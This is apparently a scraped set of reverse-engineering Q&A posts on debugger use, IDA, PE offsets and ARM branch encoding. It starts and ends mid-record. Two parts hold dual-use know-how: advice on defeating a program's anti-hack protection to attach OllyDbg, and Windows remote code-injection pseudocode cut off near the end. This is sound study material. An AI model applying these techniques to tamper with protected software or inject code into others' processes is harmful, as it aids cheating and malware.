int main(int argc, char** argv) {
    sumit++;
    return sumit;
}
</code></pre>

<p>I used OllyDbg to Disassamble, but I am not able to find where  <code>sumit</code>, <code>pranit</code> are defined in assembly. Though doing some string search I got following details:</p>

<pre><code>Names in ConsoleA, item 313  Address=013B8004  Section=.data 
Type=Library  Name=sumit

Names in ConsoleA, item 257  Address=013B8000  Section=.data 
Type=Library  Name=pranit
</code></pre>

<p>How to find, where and how it is used in assembly code. Also, I want to find out both address and value of these global variables. </p>
","<p>opening a vc commandprompt using </p>

<pre><code>start-&gt;programs-&gt;vc-&gt;vc command prompt
</code></pre>

<p>Setting environment for using Microsoft Visual Studio 2010 x86 tools.
creating a tempdir in desktop for compiling and linking</p>

<pre><code>C:\Program Files\Microsoft Visual Studio 10.0\VC&gt;cd ""c:\Documents and Settings\Admin\Desktop""
C:\Documents and Settings\Admin\Desktop&gt;md pran
C:\Documents and Settings\Admin\Desktop&gt;cd pran
C:\Documents and Settings\Admin\Desktop\pran&gt;copy con prankasum.cpp
^Z
        1 file(s) copied.
C:\Documents and Settings\Admin\Desktop\pran&gt;write prankasum.cpp    
C:\Documents and Settings\Admin\Desktop\pran&gt;type prankasum.cpp
#include &lt;stdio.h&gt;
int pranit = 2;
int&amp; sumit = pranit;
int main(int argc, char** argv)
{
sumit++;
return sumit;
}    
C:\Documents and Settings\Admin\Desktop\pran&gt;dir /b
prankasum.cpp    
C:\Documents and Settings\Admin\Desktop\pran&gt;cl /nologo /Zi prankasum.cpp /link /RELEASE
prankasum.cpp    
C:\Documents and Settings\Admin\Desktop\pran&gt;dir /b
prankasum.cpp
prankasum.exe
prankasum.obj
prankasum.pdb
vc100.pdb
</code></pre>

<p>opening the exe in ollydbg and navigating to main<br>
tab the comment column to show source and in debugging options ask ollydbg to use recogneized args and locals</p>

<pre><code>C:\Documents and Settings\Admin\Desktop\pran&gt; ollydbg prankasum.exe      
00401000  &gt;PUSH    EBP                          ; {
00401001   MOV     EBP, ESP
00401003   MOV     EAX, DWORD PTR DS:[sumit]    ; sumit++;
00401008   MOV     ECX, DWORD PTR DS:[EAX]
0040100A   ADD     ECX, 1
0040100D   MOV     EDX, DWORD PTR DS:[sumit]
00401013   MOV     DWORD PTR DS:[EDX], ECX
00401015   MOV     EAX, DWORD PTR DS:[sumit]    ; return sumit;
0040101A   MOV     EAX, DWORD PTR DS:[EAX]
0040101C   POP     EBP                          ; }
0040101D   RETN
</code></pre>

<p>or in windbg</p>

<pre><code>prankasum!main:
00401000 55              push    ebp
0:000&gt; uf @eip
prankasum!main [c:\documents and settings\admin\desktop\pran\prankasum.cpp @ 5]:
    5 00401000 55              push    ebp
    5 00401001 8bec            mov     ebp,esp
    6 00401003 a104b04000      mov     eax,dword ptr [prankasum!sumit (0040b004)]
    6 00401008 8b08            mov     ecx,dword ptr [eax]
    6 0040100a 83c101          add     ecx,1
    6 0040100d 8b1504b04000    mov     edx,dword ptr [prankasum!sumit (0040b004)]
    6 00401013 890a            mov     dword ptr [edx],ecx
    7 00401015 a104b04000      mov     eax,dword ptr [prankasum!sumit (0040b004)]
    7 0040101a 8b00            mov     eax,dword ptr [eax]
    8 0040101c 5d              pop     ebp
    8 0040101d c3              ret
0:000&gt; dv
           argc = 0n1  argv = 0x00033ba8
0:000&gt; ?? sumit     int * 0x0040b000
0:000&gt; ?? pranit    int 0n2
0:000&gt; pct    0040101d c3              ret
0:000&gt; ?? sumit    int * 0x0040b000
0:000&gt; ?? pranit    int 0n3
0:000&gt; x /t /v /q prankasum!sumit
prv global 0040b004    4 int * @!""prankasum!sumit"" = 0x0040b000
0:000&gt; x /t /v /q prankasum!pranit
prv global 0040b000    4 int @!""prankasum!pranit"" = 0n3
</code></pre>

<p><strong>update</strong></p>

<p>explanation for tabbing through comment column </p>

<p>each mdi window in ollydbg has a bar in top it can be hidden or shown</p>

<pre><code>right click -&gt; appearance -&gt; show bar / hide bar
</code></pre>

<p>each of the bars have columns and many of the colums can be configured to show different 
items in cpu window if you <code>repeatedly click the comment column</code> it will cycle through </p>

<pre><code>comment / profile/ and source
</code></pre>

<p>comment will show all the </p>

<pre><code>analysis comments / user comments
</code></pre>

<p>profile will show all the <code>run trace / hittrace/ module and global profile statistics</code></p>

<p>for example this <code>strcpy_s</code> was called 50 times during crt initialisation</p>

<pre><code>004019EC   |.  &gt;|CALL    prankasu.strcpy_s           ;  50.
</code></pre>

<p>inside this call this loop was called  ~2700 times</p>

<pre><code>00403D45   /MOV     CL, BYTE PTR DS:[EAX]       ;  2787.
00403D47   |MOV     BYTE PTR DS:[ESI+EAX], CL   ;  2787.
00403D4A   |INC     EAX                         ;  2787.
00403D4B   |TEST    CL, CL                      ;  2787.
00403D4D   |JE      SHORT prankasu.00403D52     ;  2787.
00403D4F   |DEC     EDI                         ;  2737.
00403D50   \JNZ     SHORT prankasu.00403D45     ;  2737.
00403D52   TEST    EDI, EDI                     ;  50.
</code></pre>

<p>if you cycle through to source column</p>

<pre><code>strcpy_s is from vc\crt\stdenvp.c:133.  _ERRCHECK(_tcscpy_s(*env, cchars, p));
</code></pre>

<p>see below</p>

<pre><code>004019E9   |PUSH    ESI           ; _ERRCHECK(_tcscpy_s(*env, cchars, p));
004019EA   |PUSH    EBX
004019EB   |PUSH    EAX
004019EC   |CALL    prankasu.strcpy_s
004019F1   |ADD     ESP, 0C
</code></pre>

<p>loop is from <code>vc\crt\tcscpy_s_inl</code></p>

<pre><code>00403D41   MOV     ESI, EDX        ; while ((*p++ = *_SRC++) != 0 &amp;&amp; --available &gt; 0)
00403D43   SUB     ESI, EAX
00403D45   /MOV     CL, BYTE PTR DS:[EAX]
00403D47   |MOV     BYTE PTR DS:[ESI+EAX], CL
00403D4A   |INC     EAX
00403D4B   |TEST    CL, CL
00403D4D   |JE      SHORT prankasu.00403D52
</code></pre>

<p>cycling to comment back you see</p>

<pre><code>004019E9   |.  56    |PUSH    ESI                         ; /Arg3 = 7C90DE6E
004019EA   |.  53    |PUSH    EBX                         ; |Arg2 = 00000000
004019EB   |.  50    |PUSH    EAX                         ; |Arg1 = 00000000
004019EC   |.  E8 1D&gt;|CALL    prankasu.strcpy_s           ; \strcpy_s
</code></pre>

<p><code>options-&gt;debugging options-&gt;cpu-&gt;select show symbolic address</code> will make 
<code>XXXXXX [40xxxx]</code> to be shown as </p>

<pre><code>xxxxxx [sumit]
</code></pre>

<p><code>options -&gt;debugging options-&gt;analysis-&gt;select show args and locals in procedure</code> will make all <code>ebp+XX</code> to <code>arg.1 arg.2</code> and all <code>ebp-XX</code> to <code>local.1 local.2</code> </p>

<pre><code>both ollydbg 1.10 and 2.01 behave similarly
</code></pre>

<p><code>full</code> or <code>partial (stripped down )</code>symbolic information in any acceptable format (<code>map tds pdb dbg</code> ) is <code>**mandatory**</code> <code>**requirement**</code>  </p>
","3470"
"INT 2D Anti-Forensic Method","2977","","<p>Inclusion of an <code>INT 2D</code> instruction appears to be a fairly common anti-debugging tactic used by Windows malware authors. From what I understand, it causes a process to act differently when a debugger is attached from when it is not attached.</p>

<p>I have read that this is due in part to an asynchronous (not part of normal program flow) increment to the instruction pointer. This increment can be made to lead to instruction scission.</p>

<p>Could someone explain this anti-debugging tactic, specifically <em>why</em> this increment to the instruction pointer occurs, and what happens when a debugger <em>is</em> and <em>is not</em> attached.</p>
","<p>From my ""Ultimate"" Anti-Debugging reference (see pferrie.host22.com):</p>

<p>The interrupt 0x2D is a special case.  When it is executed, Windows uses the current EIP register value as the exception address, and then it increments by one the EIP register value.  However, Windows also examines the value in the EAX register to determine how to adjust the exception address.  If the EAX register has the value of 1, 3, or 4 on all versions of Windows, or the value 5 on Windows Vista and later, then Windows will increase by one the exception address.  Finally, it issues an EXCEPTION_BREAKPOINT (0x80000003) exception if a debugger is present.  The interrupt 0x2D behaviour can cause trouble for debuggers.  The problem is that some debuggers might use the EIP register value as the address from which to resume, while other debuggers might use the exception address as the address from which to resume.  This can result in a single-byte instruction being skipped, or the execution of a completely different instruction because the first byte is missing.  These behaviours can be used to infer the presence of the debugger.  The check can be made using this code (identical for 32-bit and 64-bit) to examine either the 32-bit or 64-bit Windows environment:</p>

<pre><code>xor  eax, eax ;set Z flag
int  2dh
inc  eax ;debugger might skip
je   being_debugged
</code></pre>

<p>[end]</p>

<p>So you can see that there's nothing asynchronous happening here.  The change occurs immediately when the exception occurs.
As far as <em>why</em> it occurs, the skipped byte is intended to be used to pass one byte of additional information at the time of the exception.</p>
","1544"
"OllyDbg: Automatically extract string when breakpoint is hit","2977","","<p>Given a breakpoint at an expression <code>MOV EDI, EAX</code>, how can you automatically log/write to file the referenced string whenever the breakpoint is hit?</p>
","<p>Select the <code>MOV EDI, EAX</code> instruction and press <kbd>Shift</kbd>+<kbd>F4</kbd> to open the <strong>Conditional log</strong> breakpoint window.</p>

<p>In that window, specify <code>eax</code> as the expression, set <strong>Pause program</strong> to <strong>Never</strong>, and set <strong>Log value of expressions</strong> to <strong>Always</strong>:</p>

<p><img src=""https://i.stack.imgur.com/cXRM7.png"" alt=""Conditional log""></p>

<p>Press the <strong>OK</strong> button, run your program, and now the referenced string will get logged to OllyDbg's log window whenever that instruction is hit.</p>
","3640"
"Windows Wiki : Books and Tutorials","2976","","<p>This post is for collecting all the best books and tutorials that exist dealing with <a href=""/questions/tagged/windows"" class=""post-tag"" title=""show questions tagged &#39;windows&#39;"" rel=""tag"">windows</a> specific reverse engineering techniques and concepts. The content will be added to the <a href=""https://reverseengineering.stackexchange.com/tags/windows/info"">Windows wiki</a>. Any suggestions of books and tutorials should be added into the CW answer. Please do not add any other answers. </p>

<hr>

<p>If you have anything to say about this, post your opinion here :</p>

<ul>
<li><p><a href=""https://reverseengineering.meta.stackexchange.com/questions/53/how-should-book-tutorial-questions-be-dealt-with"">How should book/tutorial questions be dealt with?</a></p></li>
<li><p><a href=""https://reverseengineering.meta.stackexchange.com/questions/96/lets-develop-a-tag-wiki-format"">Lets develop a Tag Wiki format</a></p></li>
<li><p>If you have something else to say not covered in the above discussions, start a <a href=""https://reverseengineering.meta.stackexchange.com/questions/ask"">new meta discussion</a>.</p></li>
</ul>
","<h1>Books:</h1>

<ul>
<li><strong><a href=""http://rads.stackoverflow.com/amzn/click/0764574817"" rel=""nofollow noreferrer"">Reversing: Secrets of Reverse Engineering</a></strong>, Eldad Eilam</li>
<li><a href=""http://nostarch.com/idapro2.htm"" rel=""nofollow noreferrer""><strong>IDA Pro Book, 2nd Edition</strong></a>, Chris Eagle (<a href=""http://www.idabook.com/"" rel=""nofollow noreferrer"">book's website</a>)</li>
<li><a href=""http://nostarch.com/ghpython.htm"" rel=""nofollow noreferrer""><strong>Gray Hat Python</strong></a>, Justin Seitz</li>
<li><a href=""http://technet.microsoft.com/en-us/sysinternals/bb963901.aspx"" rel=""nofollow noreferrer""><strong>Windows Internals, 6th edition</strong></a></li>
<li><a href=""http://amzn.com/0735663777"" rel=""nofollow noreferrer""><strong>Windows via C/C++ 5th Ed</strong></a></li>
</ul>

<h1>Articles:</h1>

<h1>Tutorials:</h1>

<ul>
<li><a href=""http://tuts4you.com/download.php?list.17"" rel=""nofollow noreferrer"">Lena's Reversing 101</a> — the classic introduction for newbie reverser.</li>
<li><a href=""http://octopuslabs.io/legend/blog/sample-page.html"" rel=""nofollow noreferrer"">The Legend of Random</a> — list of tutorials and texts to read on RE topics. </li>
</ul>

<h1>Links:</h1>

<ul>
<li><a href=""http://opensecuritytraining.info/Training.html"" rel=""nofollow noreferrer"">OpenSecurityTraining</a> — place of great and free online courses to learn, from beginners to hi-level pros.</li>
</ul>

<h1>Forums:</h1>

<ul>
<li><a href=""http://www.kernelmode.info/forum/"" rel=""nofollow noreferrer"">KernelMode</a> — here you'll find not only a wide range of topics regarding different parts of RE, but also a great community. </li>
</ul>
","1755"
"Check DEP , ASLR and SafeSEH enabled or not , immlib","2941","","<p>How to check if DEP, ASLR and SafeSEH defense mechanism are enabled or not in a program using <code>immlib</code> library of Python in Immunity Debugger ? </p>

<p>Actually I am looking for small code snippet for each.</p>
","<p>You need to check the PE headers of the modules, the offset is dependent on the OS version (the settings can be different for the executable and each loaded DLL). You can look at the mona.py script for examples on how to do that. The script is very large but you should find what you are looking for in the class MnModule, for example the flag for ALSR is checked at line 1726. (Note: in this script dbglib is an abstraction class to support both Immunity Debugger and WinDBG, it maps directly to immlib).</p>

<p>Script source : <a href=""http://redmine.corelan.be/projects/mona/repository/entry/mona.py"">http://redmine.corelan.be/projects/mona/repository/entry/mona.py</a></p>
","2511"
"Offset calculation for branch instruction in ARM","2941","","<p>As the title says, how to calculate offsets for branch instructions?
For example i have following assembly code,</p>

<pre><code>0x60ECE    B loc_60EE6
;
;
;
0x60EE6    LDR.W R2, #0x123
</code></pre>

<p>Hex code for location <code>0x60ECE</code> is <code>0A E0</code>. i want to know how it is calculated. According to <a href=""https://stackoverflow.com/questions/6744661/understanding-arm-assembler-branch-offset-calculation"">https://stackoverflow.com/questions/6744661/understanding-arm-assembler-branch-offset-calculation</a> , offset should be <code>04</code> instead of <code>0A</code>.</p>

<p>I'm working on android binary.</p>
","<p>The instruction format is in little-endian, so bytes <code>0A E0</code> gets parsed as machine code <code>0xE00A</code>, or <code>1110000000001010b</code> in binary.</p>

<p>According to <a href=""https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf"" rel=""nofollow noreferrer"">the documentation for the THUMB Instruction Set</a>, the first 5 bits (<code>11100b</code>) decode to an <strong>unconditional branch</strong> opcode, and the last 11 bits (<code>00000001010b</code>) decode to <strong>Offset11</strong>:</p>

<p><img src=""https://i.imgur.com/sgVRs0z.png"" alt=""Unconditional branch""></p>

<p>As per the documentation above, the destination address is calculated as ""PC relative +/- Offset11 &lt;&lt; 1"" plus 4 for the prefetch operation.</p>

<p>If we do the math, we see that everything works out:</p>

<pre><code>   0x60ECE + (00000001010b &lt;&lt; 1) + 0x4
== 0x60ECE +       10100b        + 0x4
== 0x60ECE +        0x14         + 0x4
== 0x60EE6
</code></pre>
","9095"
"Setting a breakpoint at system call","2931","","<p>I want to modify my teamspeak server (linux), I'm particulary interested in the connection with clients (UDP), so I figured I need to set a breakpoint at the linux socket function to start reversing. How can I achieve this?</p>

<p>Thanks!</p>
","<p>In <code>gdb</code> you can set a syscall breakpoint with <code>catch syscall</code>.</p>

<p>If this is in 32-bit x86 (IA-32), check the syscall number in <code>your_linux_source_dir/usr/include/asm/unistd_32.h</code>. There is no syscall called <code>socket</code> in 32-bit x86, do you mean <code>socketcall</code>? Its number is 102.</p>

<p>If this is in x86-64 (AMD64), check the syscall number in <code>your_linux_kernel_source_dir/usr/include/asm/unistd_64.h</code>. The syscall called <code>socket</code> is 41.</p>

<p>Then run the executable in <code>gdb</code>:</p>

<pre><code>$ gdb myexecutable
</code></pre>

<p>And set the syscall breakpoint (41 is the <code>socket</code> syscall number in x86-64, change to appropriate syscall number for you):</p>

<pre><code>(gdb) catch syscall 41
</code></pre>

<p>And then run the program:</p>

<pre><code>(gdb) r
</code></pre>

<p>Using the name of syscall (such as <code>socket</code>) instead of the number (eg. <code>41</code>) may also work, depending on your configuration.</p>
","6836"
"What is the reason for this method to call itself?","2901","","<p>While reversing a 32bit Mach-O binary with Hopper, I noticed this peculiar method. The instruction on 0x0000e506 seems to be calling an address right below the instruction. </p>

<p>What would be the reason for this? Is it some kind of register cleaning trickery? </p>

<p><img src=""https://i.imgur.com/e6Pji20.png"" /></p>
","<p>This is for position independent code. The <code>call 0xe50b</code> instruction pushes the address of the next instruction, and then jumps. It jumps to the immediately following instruction, which has no effect. The next instruction, <code>pop eax</code>, loads its own address into <code>eax</code> (as it was the value pushed by <code>call</code>).</p>

<p>Further down it uses an offset from eax:</p>

<pre><code>mov eax, dword [ds:eax-0xe50b+objc_msg_close]
</code></pre>

<p>The value being subtracted, <code>0xe50b</code>, is the address that we moved into <code>eax</code>. If the code hasn't been moved anywhere, <code>eax-0xe50b</code> will be zero, but if the code has been moved to a different location, it will be the offset. We then add the address <code>objc_msg_close</code>, so we'll be able to reference it, even if the code has been moved in memory.</p>

<p>Hopper is actually being quite clever about it, because the instruction just says (from ndisasm):</p>

<pre><code>mov eax,[eax+0x45fe75]
</code></pre>

<p>but Hopper knows that <code>eax</code> contains the value of the instruction pointer at <code>0xe50b</code>, so uses that offset to find the symbol for you.</p>
","1657"
"How to prevent application from killing OllyDbg","2872","","<p>I want to run an OllyDbg and attach it to some starting later process.</p>

<p>But the problem is, that process is very aggressive: it kills OllyDbg on start, and I also can't run OllyDbg later because that process then crashes with some invective message written in some moonspeak language (there are symbols that can be read, and they tell something about 'antihack.dll', for which, though, I don't found any reference to using Dependency walker and Pe Explorer).</p>

<p>So, is there any way how to prevent this aggressive process from killing any working app and connect it somehow to OllyDbg?</p>

<p>P.S. Now is some crazy stuff going on.
Even if rum without debugger in background process fails after some time with an memory access error (and I even replaced an .exe with the original one in case of some arbitrary overwrites).</p>
","<p>What is the target program? Is it known to have an antihack? (If so, who makes it?) Are you on a 32-bit or 64-bit OS?</p>

<p>Use GMER/<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682619%28v=vs.85%29.aspx"" rel=""nofollow""><code>EnumDeviceDrivers()</code></a>/etc and check for drivers that ""antihack.dll"" might be loading. If there is a driver, load its binary into IDA and start reversing, and if you're on 32-bit grab an anti-rootkit program (GMER, kernel detective, XueTr) and remove their hooks.</p>

<blockquote>
  <p>""they tell something about 'antihack.dll', for which, though, I don't
  found any reference to using Dependency walker and Pe Explorer""</p>
</blockquote>

<p>Maybe the antihack.dll is loaded into a seperate process? Try monitoring process creation or just use taskmanager and see if there's a seperate process that is killing your Olly. Alternatively, it could just be a delayed LoadLibrary call. Also, the program might be injecting antihack.dll into your process instead of loading it (unlikely in this case).</p>

<p>If you're on a 32-bit OS, PhantOm with driver enabled should be enough to protect your Olly. If it isn't, try looking for other plugins that hide Olly. On a 64-bit OS, you would need to write your own driver, though with PatchGuard around even that will probably not be enough since they could be detecting your Olly by its window names/positions/hierarchy.</p>

<p>If you want to attach to a program with an antihack feature you would preferably partially or completely disable the antihack first. Stealthing an invasive debugger to get it to attach to an already running protected process is not a nice approach. Start with static analysis in IDA, find a way to start the program in Olly and debug the startup process, or start with less invasive dynamic analysis (Cheat Engine).</p>
","3651"
"Determining if a file is managed code or not","2869","","<p>How can I quickly tell if a EXE or DLL I have is managed code or not?</p>

<p>I spent some time recently trying to disassemble a file and then later learned through some traces in the code that I could have skipped all that work and just used ILspy. How can I avoid repeating that experience in the future?</p>
","<blockquote>
  <p>A managed DLL / Application will have a primary dependency on MSCOREE.dll... So, if you open the DLL in Dependency Walker you have
  no problems in telling a managed library from an unmanaged one.</p>

<pre><code>    http://www.dependencywalker.com/
</code></pre>
</blockquote>

<p>Quoted from <a href=""http://forums.codeguru.com/showthread.php?424454-Check-if-DLL-is-managed-or-not"">here</a></p>

<p>and other usefull link : <a href=""http://blogs.msdn.com/b/jmstall/archive/2007/10/12/how-to-tell-if-a-function-is-managed-code.aspx"">msdn</a> ; <a href=""http://blogs.msdn.com/b/kstanton/archive/2004/03/31/105060.aspx"">msdn2</a></p>
","1619"
"Is there a way to adjust local variables when a function doesn't utilize ebp?","2868","","<p>I have a problem just like in the question. Modern compilers don't use <code>ebp</code> to handle local variables and arguments, they just calculate and add hard=coded offsets to <code>esp</code>. Example: </p>

<pre><code>sub     esp, 5Eh  
...     
mov     [esp+5Eh+var_1], 123h
mov     [esp+5Eh+var_2], 456h
call    some_func            ; var_1 and var_2 point to actual addresses
cmp     eax, 0               ; esp changed (stdcall), var_1 and var_2 point to wrong addresses

...

;  creation of a ""fake"" variable example:
;  var_3 = -8h
;  var_4 = -12h 
mov     [esp+5Eh+var_3], 78h  ; var_3 at: esp + 5Eh -8h
pop     eax                   ; esp = esp + 4  
mov     [esp+5Eh+var_4], 89h  ; var_4 at: esp + 4  + 5eh -12h = esp + 5Eh -8h = var_3
; desireable fix:
mov     [esp+62h+var_3], 89h 
</code></pre>

<p>This results in a lot of overhead: IDA creates ""fake"" local variables (i.e. several names for one and the same address), you can't freely check variables whenever you want to, you have to create additional comments, etc. So I was wondering is there any way to fix that ?</p>

<p>PS. I'm using IDA Pro Free. Tell me if it is possible only in IDA Pro (full version). </p>
","<p>The variable names that IDA is generating aren't ""fake""; they are exactly the same as they would be labeled had the function been <code>ebp</code>-based. The problem you describe is only really an issue when debugging since that's the only time you can inspect the values pointed to. I'm not aware of any built-in way to get IDA to display what you want. When you hover over an operand, IDA just takes the current value of the register and adds the offset. If <code>esp</code> has changed, then it will show you the wrong address, which is what you're seeing in your example.</p>

<p>Since IDA does know the correct stack offset, one way to do what you're asking is to write an IDC script that checks <code>eip</code> and adjusts for the difference in <code>esp</code> values before calculating the final target address. The IDC function that gets the stack offset at a given address is <a href=""https://www.hex-rays.com/products/ida/support/idadoc/351.shtml"" rel=""nofollow""><code>GetSpd()</code></a>. The algorithm would go something like this:</p>

<ol>
<li>Calculate the target address of the operand you are interested in (i.e. esp+5Eh+var_1 -> 0x10000000)</li>
<li>Get the stack pointer delta (SPD) of the line containing the operand you're interested in (i.e. 5Eh)</li>
<li>Get the SPD of <code>eip</code> (i.e. 6Eh)</li>
<li>Calculate the difference of the two SPDs and add (or subtract) that amount from the target address you calculated in step 1 (i.e. 0x10000000 + (6Eh-5Eh) = 0x10000010)</li>
<li>Go to your calculated address ([0x10000010] contains the variable you are after)</li>
</ol>
","4249"
"Parsing/Rescuing corrupted IDA database","2864","","<p>I'm reversing an application with IDA.
My VM crashed and left the IDA database in a corrupted unpacked state. </p>

<p>The next time I tried to load it back, IDA gave me the following error message: <code>The input database is corrupted: CRC32 mistmatch. Continue?</code> a few times, then it quit with the error <code>bTree error: index file is bad</code>. Google-ing these error messages gave no useful results, which is unusual. </p>

<p>I'ld like restore the database, or at least extract the data somehow. </p>

<p>I've already tried the following:</p>

<ul>
<li>Zynamics bindiff (couldn't open the IDB, said it's probably opened in another IDA instance, which I guess Is a result of the corrupted data)</li>
<li>Manual hex diff - I just can't interpret the output.</li>
</ul>

<p>At this point I'm thinking of somehow <strong>parsing the IDB</strong> and then diffing that output manually.</p>

<p><strong>So, how can I parse/extract data from IDB files?</strong></p>

<p><a href=""https://reverseengineering.stackexchange.com/questions/3452/how-do-you-manage-backup-your-ida-database"">Related.</a></p>
","<p>I published some tools on github which can do just that: <a href=""https://github.com/nlitsme/pyidbutil"" rel=""noreferrer"">https://github.com/nlitsme/pyidbutil</a> and <a href=""https://github.com/nlitsme/idbutil"" rel=""noreferrer"">https://github.com/nlitsme/idbutil</a>.
The first is written in python, the second in C++, both have similar functionality.</p>

<p><code>pyidbutil</code> provides the most low level recovery options: using <code>--pagedump</code> you can dump each page in the file without the need of an intact logical file structure.</p>
","15687"
"Unpack QNX .img files","2859","","<p>I am currently investigating firmware of an embedded system (car navigation) and have identified the OS as QNX.</p>

<p>The firmware has .ifs files which I was able to extract/unpack using QNX <a href=""http://www.qnx.com/developers/docs/660/index.jsp?topic=%2Fcom.qnx.doc.neutrino.user_guide%2Ftopic%2Ffiles_FILEEXTENSIONS.html"" rel=""nofollow"">dumpifs</a> tool and .img files. The .img files do not appear to be compressed, is there a file format or dump tool for QNX .img files?</p>

<p>/edit: some extra information
file -sL file.img reports <code>x86 boot sector</code>
Mount attempt in Ubuntu <code>mount -t qnx6 ./file.img -o loop/dev/loop1,blocksize=512 /media/qnx</code> fails with wrong fs type, bad option, bad superblock on /dev/loop1</p>

<p>dmesg reports <code>qnx4: wrong fsid in superblock</code> or <code>qnx6: invalid mount operation</code></p>

<p><code>cat /proc/filesystems</code> reports both qnx4 and qnx6</p>
","<p>Last time I worked with .img file it was image of qnx6 file system.
I using linux with installed qnx6 drivers, so mount -t qnx6 works for me.</p>

<p>In addition you can download QNX sample virtual machine from qnx.com/download/index.html ,run it, mount img using standard qnx command line tools and scp it outside.</p>
","8375"
"Undo patch in IDA","2848","","<p>While I'm doing a patching using IDA, I accidentally patch wrong bites and I can't remember what bytes were there before. Is there a way to undo it..?  </p>
","<p>There is a window to see all patched bytes, along with their unpatched versions: in the menu, use <code>View</code> / <code>Open Subviews</code> / <code>Patched Bytes</code>, or press <code>STRG-ALT-P</code>.</p>

<p>This is for IDA 6.8 (newest version), i don't know if older versions have the same thing.</p>

<p>However, i recommend you to install the <a href=""https://github.com/iphelix/ida-patcher"" rel=""noreferrer"">ida patcher plugin</a>, which improves working with patches greatly; for example, you can copy/paste a patch from somewhere else; you can fill a region with identical bytes, and there is a window that's similar to the standard patcher window, but lets you assign comments to patches, and revert them with a single click to the context menu.</p>
","9520"
"""Raw"" offsets to ""disassembler"" offsets?","2830","","<p>This is a very silly question, but surprisingly I've had a problem with this today.
In a hex editor, I've found an offset and I wanted to take a look at that code in a disassembler. In the hex-editor, the offset is EBE75, and it looks like this:</p>

<p><img src=""https://i.stack.imgur.com/QmuKd.png"" alt=""enter image description here""></p>

<p>Obviously a CALL, I wanted to find it in IDA/Olly and take a look. This is, however, where I wasn't sure how to translate that to an offset that IDA/Olly could understand. Do I add the imagebase, or maybe the offset of the .text section? I've managed to find the code using IDA's hexscan, and it's located at address <code>004ECA75</code>:</p>

<p><img src=""https://i.stack.imgur.com/flPcg.png"" alt=""enter image description here""></p>

<p>The difference between these addresses is <code>4ECA75 - EBE75 = 400C00</code>. This is quite surprising to me, where did that number come from? How is this related to the .exe's layout?</p>
","<p>To convert a raw offset in a PE file to its corresponding ""disassembler offset"" (known as the virtual address or VA), you need to perform the following steps:</p>

<p><strong>Step 1</strong></p>

<p>Using a PE editor, look at the PE file's section table to find the section containing the file offset.</p>

<p>For example, let's say your PE file's section table looks like this:</p>

<pre><code>+-----------------------------------------------------------------+
|  Name  | Virtual Address | Virtual Size | Raw Offset | Raw Size |
|--------+-----------------+--------------+------------+----------|
| .text  |    00001000     |   00152CA1   |  00000400  | 00152E00 |
| .data  |    00154000     |   000040C0   |  00153200  | 00004200 |
| .rsrc  |    00159000     |   00062798   |  00157400  | 00062800 |
| .reloc |    001BC000     |   00003B3C   |  001B9C00  | 00003C00 |
+-----------------------------------------------------------------+
</code></pre>

<p>You can see above that the section containing raw offset <code>EBE75</code> is the <code>.text</code> section, since <code>00000400 &lt;= EBE75 &lt; 00153200</code>.</p>

<p><strong>Step 2</strong></p>

<p>Using a PE editor, look up the PE file's image base. For example, let's say your file's image base is <code>00400000</code>.</p>

<p><strong>Step 3</strong></p>

<p>Perform the following calculation:</p>

<pre><code>(target raw offset) - (raw offset of section) + (virtual address of section) + (image base)
= (target virtual address)
</code></pre>

<p>Filling in the example values above, we find that the virtual address for raw offset <code>EBE75</code> is:</p>

<pre><code>EBE75 - 00000400 + 00001000 + 00400000
= 4ECA75
</code></pre>
","8053"
"How to map an arbitrary address to its corresponding basic block in IDA?","2806","","<p>Say I have an arbitrary address and I want to find out which basic block (i.e. area_t structure) corresponds to it. How would I do that?</p>

<p>Edit:
more specifically, I want to know the beginning / end of the basic block to which a given address belongs.</p>
","<p>I put this together quickly in the <kbd>File</kbd> > <kbd>Python command...</kbd> dialog:</p>



<pre><code>tgtEA = idaapi.askaddr(0, ""Enter target address"")
if tgtEA is None:
  exit

f = idaapi.get_func(tgtEA)
if not f:
  print ""No function at 0x%x"" % (tgtEA)
  exit

fc = idaapi.FlowChart(f)

for block in fc:
  if block.startEA &lt;= tgtEA:
    if block.endEA &gt; tgtEA:
      print ""0x%x is part of block [0x%x - 0x%x)"" % (tgtEA, block.startEA, block.endEA)
</code></pre>

<p>Keep in mind that IDA's basic block addresses are ""<code>startEA</code> inclusive, <code>endEA</code> exclusive"". </p>
","1647"
"Does code injected into process memory always belong to a page with RWX access?","2804","","<p>I've seen a few memory forensics tutorials, which start by looking for injected code in the ""victim's"" process memory. They always seem to find the injected code in pages which have RWX access (i.e. PAGE_EXECUTE_READWRITE). </p>

<p>Does this assumption always hold? Does code injected (e.g. by malware) into the process memory of a ""victim"", always belong to a page with RWX access? Or can the page access be changed, by the code that is injected? If so, how can this change be done via winapi?</p>
","<p>The assumption does not hold true, as it is possible to alter page protection flags <em>after</em> you've allocated memory.</p>

<p>The usual mechanism for code injection on Windows is as follows:</p>

<ol>
<li>Call <code>OpenProcess</code> for the target process, to get a handle that has appropriate access privileges.</li>
<li>Use <code>VirtualAllocEx</code> to allocate a buffer in the target process, with a set of memory page access flags.</li>
<li>Use <code>WriteProcessMemory</code> to copy the memory to the target.</li>
<li>Either patch existing code to jump to the new code block, or use <code>CreateRemoteThread</code> to execute within the process via a new thread.</li>
</ol>

<p>Now, there are two options here. The first is that you can specify <code>PAGE_EXECUTE_READWRITE</code> as a flag to <code>VirtualAllocEx</code>, so that you have the right to use <code>WriteProcessMemory</code> on that page, and also the right to execute that memory when you get to step 4. This is the ""lazy"" way that leads to having RWX buffers hanging around. The alternative way is to pass <code>PAGE_READWRITE</code> when allocating the block, then write the code, and call <code>VirtualProtectEx</code> to swap the flag over to <code>PAGE_EXECUTE_READ</code> before step 4. This gives you an RW buffer when copying data, then an RX buffer when executing.</p>

<p>Pseudocode:</p>

<pre><code>rights = PROCESS_VM_OPERATION |
         PROCESS_VM_READ | PROCESS_VM_WRITE | 
         PROCESS_QUERY_INFORMATION | 
         PROCESS_CREATE_THREAD;

handle = OpenProcess(rights, false, pid);

targetAddr = VirtualAllocEx(handle, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

buffer = ""Hello, world!\0"";
bytesWritten = 0;
WriteProcessMemory(handle, targetAddr, buffer, 14, &amp;bytesWritten);

oldProtect = 0;
VirtualProtectEx(handle, targetAddr, 4096, PAGE_EXECUTE_READ, &amp;oldProtect);

threadId = 0;
